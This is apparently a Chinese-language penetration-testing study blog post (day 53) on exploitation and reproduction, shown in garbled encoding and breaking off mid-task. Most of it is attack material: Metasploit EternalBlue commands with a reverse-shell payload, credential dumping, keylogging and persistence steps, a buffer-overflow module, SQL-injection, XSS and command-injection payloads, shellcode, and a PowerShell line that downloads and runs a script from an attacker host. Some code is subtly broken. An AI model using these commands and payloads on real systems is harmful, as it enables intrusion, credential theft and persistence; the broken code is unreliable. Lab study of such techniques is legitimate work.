---
title: Day053ï¼šæ¸—é€æµ‹è¯•æ–¹æ³•è®º - éªŒè¯ä¸å¤ç°è®°å½•
tags:
  - ç½‘ç»œ
  - å®‰å…¨
  - å­¦ä¹ è®¡åˆ’
categories:
  - ç½‘ç»œå®‰å…¨
abbrlink: c21ea50c
date: 2026-02-15 00:00:00
updated: 2026-02-15 00:00:00

---
# Day053ï¼šæ¸—é€æµ‹è¯•æ–¹æ³•è®º - éªŒè¯ä¸å¤ç°è®°å½•

- æ—¥æœŸï¼š2026-02-15
- å‘¨æ¬¡ï¼šç¬¬8å‘¨

## å­¦ä¹ ç›®æ ‡

ä»Šå¤©ä½ å°†æŒæ¡æ¸—é€æµ‹è¯•æ¼æ´åˆ©ç”¨ä¸å¤ç°çš„æ ¸å¿ƒçŸ¥è¯†ï¼š

- **ç†è§£æ¼æ´åˆ©ç”¨åŸç†**ï¼šæŒæ¡æ¼æ´åˆ©ç”¨çš„åŸºæœ¬æ¦‚å¿µã€æŠ€æœ¯å’Œæµç¨‹
- **ä½¿ç”¨åˆ©ç”¨æ¡†æ¶**ï¼šèƒ½ç†Ÿç»ƒä½¿ç”¨ Metasploitã€Cobalt Strike ç­‰æ¼æ´åˆ©ç”¨æ¡†æ¶
- **å¼€å‘ PoC**ï¼šèƒ½ç¼–å†™æ¼æ´éªŒè¯è„šæœ¬ï¼ˆProof of Conceptï¼‰
- **ç»•è¿‡å®‰å…¨é˜²æŠ¤**ï¼šäº†è§£å¹¶èƒ½åº”ç”¨å¸¸è§çš„é˜²æŠ¤ç»•è¿‡æŠ€æœ¯
- **è®°å½•å¤ç°è¿‡ç¨‹**ï¼šèƒ½è§„èŒƒåŒ–è®°å½•æ¼æ´å¤ç°æ­¥éª¤å’Œè¯æ®

---

<!--more-->

## å­¦ä¹ å†…å®¹

### 1ï¸âƒ£ æ¼æ´åˆ©ç”¨åŸºç¡€ç†è®º

#### 1.1 æ¼æ´ç”Ÿå‘½å‘¨æœŸ

```python
#!/usr/bin/env python3
"""
æ¼æ´ç”Ÿå‘½å‘¨æœŸç®¡ç†
éµå¾ª CVEã€CVSS æ ‡å‡†
"""
from __future__ import annotations
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional
import json


class VulnerabilityStage(Enum):
    """æ¼æ´é˜¶æ®µ"""
    DISCOVERED = "å‘ç°"
    REPORTED = "æŠ¥å‘Š"
    PATCHED = "å·²ä¿®å¤"
    EXPLOITABLE = "å¯åˆ©ç”¨"
    EXPLOITED = "å·²åˆ©ç”¨"
    MITIGATED = "å·²ç¼“è§£"


class ExploitabilityLevel(Enum):
    """å¯åˆ©ç”¨æ€§ç­‰çº§"""
    MATURE = 3  # æˆç†Ÿåˆ©ç”¨ä»£ç 
    PROOF_OF_CONCEPT = 2  # PoC
    UNCONFIRMED = 1  # æœªç¡®è®¤


@dataclass
class CVEInfo:
    """CVE ä¿¡æ¯"""
    cve_id: str
    description: str
    cvss_score: float
    cvss_vector: str
    published_date: datetime
    affected_vendor: str
    affected_product: str
    affected_versions: list[str]
    references: list[str] = field(default_factory=list)
    exploit_available: bool = False
    patch_available: bool = False


@dataclass
class ExploitInfo:
    """æ¼æ´åˆ©ç”¨ä¿¡æ¯"""
    cve_id: str
    exploit_type: str  # remote, local, dos
    platform: str  # windows, linux, multi
    architecture: str  # x86, x64, arm
    privileges_required: str  # none, low, high
    exploitability: ExploitabilityLevel
    reliability: float  # 0-1
    references: list[str] = field(default_factory=list)
    code_snippets: list[str] = field(default_factory=list)


@dataclass
class VulnerabilityFinding:
    """æ¼æ´å‘ç°"""
    id: str
    title: str
    cve: Optional[CVEInfo]
    exploit: Optional[ExploitInfo]
    description: str
    impact: str
    remediation: str
    severity: str  # Critical, High, Medium, Low
    cvss_score: float
    affected_asset: str
    evidence: list[str] = field(default_factory=list)
    discovered_at: datetime = field(default_factory=datetime.now)


class VulnerabilityLifecycleManager:
    """æ¼æ´ç”Ÿå‘½å‘¨æœŸç®¡ç†å™¨"""
    
    def __init__(self):
        self.vulnerabilities: list[VulnerabilityFinding] = []
    
    def add_finding(self, finding: VulnerabilityFinding) -> None:
        """æ·»åŠ æ¼æ´å‘ç°"""
        self.vulnerabilities.append(finding)
    
    def get_findings_by_severity(self, severity: str) -> list[VulnerabilityFinding]:
        """æŒ‰ä¸¥é‡æ€§ç­›é€‰"""
        return [v for v in self.vulnerabilities if v.severity == severity]
    
    def get_findings_with_exploit(self) -> list[VulnerabilityFinding]:
        """ç­›é€‰æœ‰åˆ©ç”¨ä»£ç çš„æ¼æ´"""
        return [v for v in self.vulnerabilities if v.exploit is not None]
    
    def generate_exploit_matrix(self) -> dict:
        """ç”Ÿæˆåˆ©ç”¨çŸ©é˜µ"""
        matrix = {
            "remote": [],
            "local": [],
            "dos": []
        }
        
        for vuln in self.vulnerabilities:
            if vuln.exploit:
                matrix[vuln.exploit.exploit_type].append({
                    "id": vuln.id,
                    "title": vuln.title,
                    "cve": vuln.cve.cve_id if vuln.cve else None,
                    "platform": vuln.exploit.platform,
                    "reliability": vuln.exploit.reliability
                })
        
        return matrix
    
    def calculate_risk_score(self, finding: VulnerabilityFinding) -> float:
        """è®¡ç®—é£é™©è¯„åˆ†"""
        base_score = finding.cvss_score
        
        # å¯åˆ©ç”¨æ€§è°ƒæ•´
        if finding.exploit:
            exploit_factor = finding.exploit.exploitability.value / 3
            base_score *= (1 + exploit_factor * 0.2)
        
        return min(10, base_score)
```

#### 1.2 CVSS è¯„åˆ†è¯¦è§£

```python
#!/usr/bin/env python3
"""
CVSS 3.1 è¯„åˆ†è®¡ç®—å™¨
"""
from __future__ import annotations
from dataclasses import dataclass
from enum import Enum
import math


class CVSSVector(Enum):
    """CVSS å‘é‡ç»„ä»¶"""
    
    # Attack Vector (æ”»å‡»å‘é‡)
    AV_NETWORK = "N"
    AV_ADJACENT = "A"
    AV_LOCAL = "L"
    AV_PHYSICAL = "P"
    
    # Attack Complexity (æ”»å‡»å¤æ‚åº¦)
    AC_LOW = "L"
    AC_HIGH = "H"
    
    # Privileges Required (æ‰€éœ€æƒé™)
    PR_NONE = "N"
    PR_LOW = "L"
    PR_HIGH = "H"
    
    # User Interaction (ç”¨æˆ·äº¤äº’)
    UI_NONE = "N"
    UI_REQUIRED = "R"
    
    # Scope (èŒƒå›´)
    SC_UNCHANGED = "U"
    SC_CHANGED = "C"
    
    # Confidentiality (æœºå¯†æ€§)
    C_HIGH = "H"
    C_LOW = "L"
    C_NONE = "N"
    
    # Integrity (å®Œæ•´æ€§)
    I_HIGH = "H"
    I_LOW = "L"
    I_NONE = "N"
    
    # Availability (å¯ç”¨æ€§)
    A_HIGH = "H"
    A_LOW = "L"
    A_NONE = "N"


@dataclass
class CVSSMetrics:
    """CVSS æŒ‡æ ‡"""
    attack_vector: CVSSVector
    attack_complexity: CVSSVector
    privileges_required: CVSSVector
    user_interaction: CVSSVector
    scope: CVSSVector
    confidentiality: CVSSVector
    integrity: CVSSVector
    availability: CVSSVector


class CVSSCalculator:
    """CVSS 3.1 è¯„åˆ†è®¡ç®—å™¨"""
    
    # æƒé‡ç³»æ•°
    WEIGHTS = {
        'AV': {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20},
        'AC': {'L': 0.77, 'H': 0.44},
        'PR': {
            'U': {'N': 0.85, 'L': 0.62, 'H': 0.27},
            'C': {'N': 0.85, 'L': 0.68, 'H': 0.50}
        },
        'UI': {'N': 0.85, 'R': 0.62},
        'S': {'U': 1.0, 'C': 1.0},  # Scope ç‰¹æ®Šå¤„ç†
        'C': {'H': 0.56, 'L': 0.22, 'N': 0.0},
        'I': {'H': 0.56, 'L': 0.22, 'N': 0.0},
        'A': {'H': 0.56, 'L': 0.22, 'N': 0.0}
    }
    
    @classmethod
    def calculate_base_score(cls, metrics: CVSSMetrics) -> float:
        """è®¡ç®—åŸºç¡€è¯„åˆ†"""
        # è·å–æƒé‡
        AV = cls.WEIGHTS['AV'][metrics.attack_vector.value]
        AC = cls.WEIGHTS['AC'][metrics.attack_complexity.value]
        
        if metrics.scope == CVSSVector.SC_UNCHANGED:
            PR = cls.WEIGHTS['PR']['U'][metrics.privileges_required.value]
        else:
            PR = cls.WEIGHTS['PR']['C'][metrics.privileges_required.value]
        
        UI = cls.WEIGHTS['UI'][metrics.user_interaction.value]
        
        C = cls.WEIGHTS['C'][metrics.confidentiality.value]
        I = cls.WEIGHTS['I'][metrics.integrity.value]
        A = cls.WEIGHTS['A'][metrics.availability.value]
        
        # ISS (Impact Sub Score)
        iss = 1 - ((1 - C) * (1 - I) * (1 - A))
        
        # Impact
        if metrics.scope == CVSSVector.SC_UNCHANGED:
            impact = 6.42 * iss
        else:
            impact = 7.52 * (iss - 0.029) - 3.25 * (iss - 0.02) ** 15
        
        # Exploitability
        exploitability = 8.22 * AV * AC * PR * UI
        
        # Base Score
        if impact <= 0:
            base_score = 0
        else:
            if metrics.scope == CVSSVector.SC_UNCHANGED:
                base_score = min((impact + exploitability), 10)
            else:
                base_score = min(1.08 * (impact + exploitability), 10)
        
        return round(base_score, 1)
    
    @classmethod
    def get_severity_level(cls, score: float) -> str:
        """è·å–ä¸¥é‡æ€§ç­‰çº§"""
        if score >= 9.0:
            return "Critical"
        elif score >= 7.0:
            return "High"
        elif score >= 4.0:
            return "Medium"
        elif score > 0:
            return "Low"
        else:
            return "None"


# ç¤ºä¾‹ä½¿ç”¨
if __name__ == "__main__":
    # è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç¤ºä¾‹
    metrics = CVSSMetrics(
        attack_vector=CVSSVector.AV_NETWORK,
        attack_complexity=CVSSVector.AC_LOW,
        privileges_required=CVSSVector.PR_NONE,
        user_interaction=CVSSVector.UI_NONE,
        scope=CVSSVector.SC_UNCHANGED,
        confidentiality=CVSSVector.C_HIGH,
        integrity=CVSSVector.I_HIGH,
        availability=CVSSVector.A_HIGH
    )
    
    score = CVSSCalculator.calculate_base_score(metrics)
    severity = CVSSCalculator.get_severity_level(score)
    
    print(f"CVSS Base Score: {score}")
    print(f"Severity Level: {severity}")
```

---

### 2ï¸âƒ£ Metasploit æ¸—é€æ¡†æ¶

#### 2.1 Metasploit åŸºç¡€

```bash
#!/bin/bash
# Metasploit åŸºç¡€å‘½ä»¤

# å¯åŠ¨ Metasploit
msfconsole

# æœç´¢æ¼æ´æ¨¡å—
search type:exploit platform:windows cve:2017

# ä½¿ç”¨æ¼æ´æ¨¡å—
use exploit/windows/smb/ms17_010_eternalblue

# æŸ¥çœ‹é€‰é¡¹
show options

# è®¾ç½®å‚æ•°
set RHOSTS 10.0.0.10
set RPORT 445
set LHOST 10.0.0.5
set LPORT 4444

# æŸ¥çœ‹å¯ç”¨è½½è·
show payloads

# è®¾ç½®è½½è·
set payload windows/x64/meterpreter/reverse_tcp

# è¿è¡Œæ¼æ´åˆ©ç”¨
exploit

# åæ¸—é€æ¨¡å—
run post/windows/gather/hashdump
run post/multi/manage/autoroute

# ä½¿ç”¨ auxiliary æ¨¡å—
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run
```

#### 2.2 Meterpreter é«˜çº§ä½¿ç”¨

```bash
# Meterpreter åŸºæœ¬å‘½ä»¤
sysinfo          # ç³»ç»Ÿä¿¡æ¯
getuid           # å½“å‰ç”¨æˆ·
getpid           # å½“å‰è¿›ç¨‹ID
ps               # è¿›ç¨‹åˆ—è¡¨
migrate <pid>    # è¿ç§»è¿›ç¨‹

# æƒé™æå‡
getsystem        # å°è¯•ææƒ

# å“ˆå¸Œçªƒå–
hashdump         # è·å–å¯†ç å“ˆå¸Œ

# å‡­è¯æ”¶é›†
load kiwi        # ä½¿ç”¨ mimikatz
creds_all        # è·å–æ‰€æœ‰å‡­è¯

# å±å¹•æˆªå›¾
screenshot

# é”®ç›˜è®°å½•
keyscan_start
keyscan_dump
keyscan_stop

# æŒä¹…åŒ–
run persistence -A -L 10.0.0.5 -p 4444 -i 30

# æ¨ªå‘ç§»åŠ¨
run get_local_subnets
run post/multi/manage/autoroute
use auxiliary/server/socks4a
```

#### 2.3 è‡ªå®šä¹‰æ¨¡å—å¼€å‘

```ruby
#!/usr/bin/env ruby
# è‡ªå®šä¹‰ Metasploit æ¨¡å—

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Custom Buffer Overflow',
      'Description' => 'A custom buffer overflow exploit',
      'Author' => ['Your Name'],
      'References' =>
        [
          ['CVE', '2024-0001'],
          ['EDB', '12345']
        ],
      'Platform' => 'win',
      'Targets' =>
        [
          ['Windows XP SP3', { 'Ret' => 0x7C914393 }],  # calc.exe
          ['Windows 7', { 'Ret' => 0x7C9010B2 }]
        ],
      'Payload' =>
        {
          'Space' => 500,
          'BadChars' => "\x00\x0a\x0d",
          'EncoderType' => Msf::Encoder::Type::Alphanum,
          'DisableNops' => true
        },
      'Privileged' => false,
      'DisclosureDate' => '2024-01-01',
      'DefaultTarget' => 0))
  end

  def check
    # æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨
    connect
    sock.put('PING\r\n')
    response = sock.get(15)
    disconnect

    if response =~ /PONG/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    connect

    # æ„å»ºåˆ©ç”¨æ•°æ®
    buffer = make_nops(100)
    buffer << [target['Ret']].pack('V')
    buffer << payload.encoded

    sock.put(buffer)
    handler
    disconnect
  end
end
```

---

### 3ï¸âƒ£ æ¼æ´éªŒè¯ä¸ PoC å¼€å‘

#### 3.1 Python PoC æ¨¡æ¿

```python
#!/usr/bin/env python3
"""
æ¼æ´éªŒè¯è„šæœ¬ (PoC) æ¨¡æ¿
"""
from __future__ import annotations
import argparse
import socket
import time
from dataclasses import dataclass
from typing import Optional
import json


@dataclass
class VulnerabilityResult:
    """æ¼æ´æ£€æµ‹ç»“æœ"""
    vulnerable: bool
    target: str
    port: int
    service: Optional[str]
    evidence: str
    remediation: str


class ExploitTemplate:
    """æ¼æ´åˆ©ç”¨æ¨¡æ¿"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.timeout = 10
        self.results: list[VulnerabilityResult] = []
    
    def check_vulnerability(self) -> VulnerabilityResult:
        """æ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨ï¼ˆå­ç±»é‡å†™ï¼‰"""
        raise NotImplementedError
    
    def exploit(self) -> Optional[VulnerabilityResult]:
        """åˆ©ç”¨æ¼æ´ï¼ˆå­ç±»é‡å†™ï¼‰"""
        return None
    
    def run(self, mode: str = 'check') -> list[VulnerabilityResult]:
        """è¿è¡Œæ£€æµ‹æˆ–åˆ©ç”¨"""
        if mode == 'check':
            result = self.check_vulnerability()
            self.results.append(result)
        elif mode == 'exploit':
            result = self.exploit()
            if result:
                self.results.append(result)
        
        return self.results


class EternalBlueCheck(ExploitTemplate):
    """æ°¸æ’ä¹‹è“æ¼æ´æ£€æµ‹ (CVE-2017-0144)"""
    
    def check_vulnerability(self) -> VulnerabilityResult:
        """æ£€æµ‹ MS17-010"""
        try:
            # åˆ›å»º SMB è¿æ¥
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            # å‘é€ SMB negotiate è¯·æ±‚
            negotiate_request = b'\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            sock.send(negotiate_request)
            
            # æ¥æ”¶å“åº”
            response = sock.recv(1024)
            sock.close()
            
            # æ£€æŸ¥å“åº”ä¸­çš„ Dialect åˆ—è¡¨
            if b'\x02\x02' in response or b'\x02\x03' in response:
                return VulnerabilityResult(
                    vulnerable=True,
                    target=self.target,
                    port=self.port,
                    service="SMB",
                    evidence=f"SMBv1 supported, Dialect match found",
                    remediation="Apply MS17-010 security update. Disable SMBv1."
                )
            
            return VulnerabilityResult(
                vulnerable=False,
                target=self.target,
                port=self.port,
                service="SMB",
                evidence="SMBv1 not supported or disabled",
                remediation="N/A"
            )
            
        except Exception as e:
            return VulnerabilityResult(
                vulnerable=False,
                target=self.target,
                port=self.port,
                service="SMB",
                evidence=f"Connection error: {str(e)}",
                remediation="Unable to verify"
            )


class ApacheStrutsCheck(ExploitTemplate):
    """Apache Struts æ¼æ´æ£€æµ‹ (CVE-2017-5638)"""
    
    def check_vulnerability(self) -> VulnerabilityResult:
        """æ£€æµ‹ CVE-2017-5638"""
        import http.client
        
        try:
            # å‘é€æ¶æ„ Content-Type å¤´
            headers = {
                'Content-Type': '%{(#_=\'multipart/form-data\').'
                               '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
                               '(#_memberAccess?'
                               ':#_context.get(\"ognl.security.manager\")).'
                               '(#context.setMemberAccess(#dm))}'
            }
            
            conn = http.client.HTTPConnection(self.target, self.port, timeout=self.timeout)
            conn.request('GET', '/', headers=headers)
            response = conn.getresponse()
            
            # æ£€æŸ¥æ˜¯å¦è¿”å› OGNL è¡¨è¾¾å¼é”™è¯¯
            if response.status == 500 and b'ognl' in response.read().lower():
                return VulnerabilityResult(
                    vulnerable=True,
                    target=self.target,
                    port=self.port,
                    service="HTTP",
                    evidence="OGNL expression evaluation in error response",
                    remediation="Upgrade Apache Struts to 2.3.32 or 2.5.10.1"
                )
            
            return VulnerabilityResult(
                vulnerable=False,
                target=self.target,
                port=self.port,
                service="HTTP",
                evidence="No OGNL error detected",
                remediation="N/A"
            )
            
        except Exception as e:
            return VulnerabilityResult(
                vulnerable=False,
                target=self.target,
                port=self.port,
                service="HTTP",
                evidence=f"Connection error: {str(e)}",
                remediation="Unable to verify"
            )


def main():
    """å‘½ä»¤è¡Œå…¥å£"""
    parser = argparse.ArgumentParser(description='Vulnerability PoC Scanner')
    parser.add_argument('--target', required=True, help='Target IP')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    parser.add_argument('--vuln', choices=['ms17-010', 'struts'], required=True)
    parser.add_argument('--mode', choices=['check', 'exploit'], default='check')
    
    args = parser.parse_args()
    
    if args.vuln == 'ms17-010':
        checker = EternalBlueCheck(args.target, args.port)
    elif args.vuln == 'struts':
        checker = ApacheStrutsCheck(args.target, args.port)
    
    results = checker.run(args.mode)
    
    for result in results:
        print(f"\n{'='*60}")
        print(f"Target: {result.target}:{result.port}")
        print(f"Service: {result.service}")
        print(f"Vulnerable: {result.vulnerable}")
        print(f"Evidence: {result.evidence}")
        print(f"Remediation: {result.remediation}")
        print(f"{'='*60}")
    
    # ä¿å­˜ç»“æœ
    output = {
        "target": args.target,
        "port": args.port,
        "vulnerability": args.vuln,
        "results": [vars(r) for r in results]
    }
    
    with open('vulnerability_scan_results.json', 'w') as f:
        json.dump(output, f, indent=2)


if __name__ == "__main__":
    main()
```

#### 3.2 Web æ¼æ´ PoC æ¡†æ¶

```python
#!/usr/bin/env python3
"""
Web æ¼æ´ PoC æ¡†æ¶
"""
from __future__ import annotations
import requests
from dataclasses import dataclass
from typing import Optional
import json


@dataclass
class WebVulnResult:
    """Web æ¼æ´æ£€æµ‹ç»“æœ"""
    url: str
    vulnerability_type: str
    vulnerable: bool
    payload: str
    response_preview: str
    remediation: str


class WebVulnerabilityScanner:
    """Web æ¼æ´æ‰«æå™¨"""
    
    def __init__(self, base_url: str, verbose: bool = False):
        self.base_url = base_url
        self.verbose = verbose
        self.session = requests.Session()
    
    def check_sql_injection(self, url: str, param: str) -> WebVulnResult:
        """SQL æ³¨å…¥æ£€æµ‹"""
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "admin' -- ",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' UNION SELECT 1,2,3--"
        ]
        
        for payload in payloads:
            try:
                target_url = f"{url}?{param}={payload}"
                response = self.session.get(target_url, timeout=10)
                
                # æ£€æµ‹ SQL é”™è¯¯
                sql_errors = [
                    "You have an error in your SQL syntax",
                    "Warning: mysql_",
                    "ORA-01756",
                    "SQLSyntaxErrorException",
                    "Dynamic SQL Error"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        return WebVulnResult(
                            url=target_url,
                            vulnerability_type="SQL Injection",
                            vulnerable=True,
                            payload=payload,
                            response_preview=response.text[:500],
                            remediation="Use parameterized queries. Input validation."
                        )
                
                # æ£€æµ‹å¸ƒå°”ç›²æ³¨
                if payload == "' OR '1'='1" and len(response.text) > 1000:
                    return WebVulnResult(
                        url=target_url,
                        vulnerability_type="SQL Injection (Blind)",
                        vulnerable=True,
                        payload=payload,
                        response_preview="Response length changed",
                        remediation="Use parameterized queries. Implement WAF."
                    )
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error testing {payload}: {e}")
        
        return WebVulnResult(
            url=url,
            vulnerability_type="SQL Injection",
            vulnerable=False,
            payload="",
            response_preview="",
            remediation="N/A"
        )
    
    def check_xss(self, url: str, param: str) -> WebVulnResult:
        """XSS æ£€æµ‹"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                target_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = self.session.get(target_url, timeout=10)
                
                # æ£€æŸ¥ payload æ˜¯å¦åœ¨å“åº”ä¸­
                if payload in response.text:
                    return WebVulnResult(
                        url=target_url,
                        vulnerability_type="Cross-Site Scripting (XSS)",
                        vulnerable=True,
                        payload=payload,
                        response_preview=response.text[:500],
                        remediation="Output encoding. Content Security Policy."
                    )
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error testing {payload}: {e}")
        
        return WebVulnResult(
            url=url,
            vulnerability_type="Cross-Site Scripting (XSS)",
            vulnerable=False,
            payload="",
            response_preview="",
            remediation="N/A"
        )
    
    def check_command_injection(self, url: str, param: str) -> WebVulnResult:
        """å‘½ä»¤æ³¨å…¥æ£€æµ‹"""
        payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "; cat /etc/passwd",
            "| ping -c 1 127.0.0.1"
        ]
        
        for payload in payloads:
            try:
                target_url = f"{url}?{param}={requests.utils.quote(payload)}"
                response = self.session.get(target_url, timeout=10)
                
                # æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ
                if "root:" in response.text or "daemon:" in response.text:
                    return WebVulnResult(
                        url=target_url,
                        vulnerability_type="Command Injection",
                        vulnerable=True,
                        payload=payload,
                        response_preview=response.text[:500],
                        remediation="Input validation. Avoid system() calls."
                    )
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error testing {payload}: {e}")
        
        return WebVulnResult(
            url=url,
            vulnerability_type="Command Injection",
            vulnerable=False,
            payload="",
            response_preview="",
            remediation="N/A"
        )
```

---

### 4ï¸âƒ£ é˜²æŠ¤ç»•è¿‡æŠ€æœ¯

#### 4.1 ç¼–ç ä¸æ··æ·†

```python
#!/usr/bin/env python3
"""
Payload ç¼–ç ä¸æ··æ·†
"""
from __future__ import annotations
import base64
import codecs
from typing import str


class PayloadEncoder:
    """Payload ç¼–ç å™¨"""
    
    @staticmethod
    def base64_encode(data: str) -> str:
        """Base64 ç¼–ç """
        return base64.b64encode(data.encode()).decode()
    
    @staticmethod
    def base64_encode_with_preamble(data: str) -> str:
        """å¸¦ PowerShell é¢„ç¼–ç çš„ Base64"""
        encoded = base64.b64encode(data.encode('utf-16le')).decode()
        return f"powershell -EncodedCommand {encoded}"
    
    @staticmethod
    def hex_encode(data: str) -> str:
        """åå…­è¿›åˆ¶ç¼–ç """
        return data.encode().hex()
    
    @staticmethod
    def url_encode(data: str) -> str:
        """URL ç¼–ç """
        from urllib.parse import quote
        return quote(data, safe='')
    
    @staticmethod
    def unicode_escape(data: str) -> str:
        """Unicode è½¬ä¹‰"""
        return data.encode('unicode_escape').decode()
    
    @staticmethod
    def rot13(data: str) -> str:
        """ROT13 ç¼–ç """
        return codecs.encode(data, 'rot_13')


class ShellcodeGenerator:
    """Shellcode ç”Ÿæˆå™¨"""
    
    # å¸¸ç”¨çš„ shellcode æ¨¡æ¿
    SHELLCODE_TEMPLATES = {
        'windows_reverse_shell': bytes([
            # x64 Windows reverse shell shellcode placeholder
            0x48, 0x31, 0xff, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x50, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x50, 0x49, 0x89, 0xfe, 0x49, 0x89, 0xf9,
            0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x00, 0x00,
            0x00, 0x00, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x89, 0xfa, 0x48,
            0xc1, 0xea, 0x20, 0x0f, 0x30, 0xc3
        ]),
        'linux_execve': bytes([
            # x86 Linux execve /bin/sh
            0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68,
            0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
            0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
        ])
    }
    
    @staticmethod
    def xor_encode(shellcode: bytes, key: int = 0xAA) -> tuple[bytes, bytes]:
        """XOR ç¼–ç  shellcode"""
        encoded = bytes([b ^ key for b in shellcode])
        return encoded, bytes([key])
    
    @staticmethod
    def generate_polymorphic(
        template: bytes, 
        mutation_level: int = 1
    ) -> bytes:
        """ç”Ÿæˆå¤šæ€ shellcode"""
        # ç®€å•å˜å¼‚ï¼šæ·»åŠ  NOP sled
        if mutation_level >= 1:
            nop_sled = b'\x90' * 16
            return nop_sled + template
        
        return template


# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    # PowerShell å‘½ä»¤ç¼–ç 
    psh_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/shell.ps1')"
    encoded = PayloadEncoder.base64_encode_with_preamble(psh_cmd)
    
    print(f"Original: {psh_cmd}")
    print(f"Encoded: {encoded}")
```

#### 4.2 Web é˜²æŠ¤ç»•è¿‡

```bash
#!/bin/bash
# Web åº”ç”¨é˜²ç«å¢™ç»•è¿‡æŠ€æœ¯

# 1. å¤§å°å†™å˜æ¢
sqlmap -u "http://target.com?id=1" --random-agent --delay=1

# 2. ç¼–ç ç»•è¿‡
# Base64 ç¼–ç  payload
echo "SELECT * FROM users" | base64
# U1FMRVMgKiBGUk9NIHVzZXJz

# 3. ç©ºæ ¼æ›¿æ¢
# %09, %0a, %0b, %0c, %0d, %20
curl "http://target.com?id=1%09UNION%09SELECT"

# 4. æ³¨é‡Šå¹²æ‰°
# /**/ , --+, #, /*!*/

# 5. HTTP æ–¹æ³•å˜æ¢
curl -X OPTIONS -v http://target.com

# 6. åè®®å˜æ¢
# HTTP -> HTTPS
# GET -> POST with _method parameter

# 7. WAF æŒ‡çº¹è¯†åˆ«
wafw00f http://target.com

# 8. ç»•è¿‡è§„åˆ™
sqlmap -u "http://target.com?id=1" \
    --tamper=space2comment,randomcase,charencode
```

---

## å®è·µä»»åŠ¡ï¼ˆåˆæ³•æˆæƒèŒƒå›´å†…ï¼‰

> **æ³¨æ„**ï¼šä»¥ä¸‹ä»»åŠ¡è¯·åœ¨ä½ è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒã€è™šæ‹Ÿæœºæˆ–æˆæƒé¶åœºä¸­æ‰§è¡Œã€‚

---

### ä»»åŠ¡ 1ï¼ˆå¿…åšï¼‰ï¼šä½¿ç”¨ Metasploit è¿›è¡Œæ¼æ´åˆ©ç”¨

**ç›®æ ‡**ï¼šåœ¨æˆæƒé¶åœºä¸­ä½¿ç”¨ Metasploit åˆ©ç”¨å·²çŸ¥æ¼æ´ã€‚

**æ­¥éª¤**ï¼š

1. **æ‰«æé¶æœºè¯†åˆ«æ¼æ´**

```bash
# ä½¿ç”¨ Nmap æ‰«æ
nmap -sV -sC 10.0.0.10 -oN nmap_scan.txt

# ä½¿ç”¨ Nessus æˆ– OpenVAS
nessus-cli -c scan_policy.xml --target 10.0.0.10
```

2. **ä½¿ç”¨ Metasploit åˆ©ç”¨æ¼æ´**

```bash
# å¯åŠ¨ Metasploit
msfconsole

# æœç´¢ç›¸å…³æ¨¡å—
search type:exploit platform:linux year:2017

# ä½¿ç”¨ EternalBlue (Windows)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# è·å– Meterpreter shell
sysinfo
getuid
```

3. **åæ¸—é€ä¿¡æ¯æ”¶é›†**

```bash
# åœ¨ Meterpreter ä¸­
meterpreter> sysinfo
meterpreter> getuid
meterpreter> run post/windows/gather/hashdump
meterpreter> run post/multi/manage/backup_netkat
```

---

### ä»»åŠ¡ 2ï¼ˆå¿…åšï¼‰ï¼šç¼–å†™æ¼æ´ PoC

**ç›®æ ‡**ï¼šä¸ºå‘ç°çš„æ¼æ´ç¼–å†™éªŒè¯è„šæœ¬ã€‚

**æ­¥éª¤**ï¼š

1. **åˆ†ææ¼æ´**

```python
#!/usr/bin/env python3
# åˆ†æ CVE-2024-XXXX æ¼æ´

"""
æ¼æ´æè¿°: æŸç³»ç»Ÿå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´
å½±å“ç‰ˆæœ¬: 1.0.0 - 2.1.0
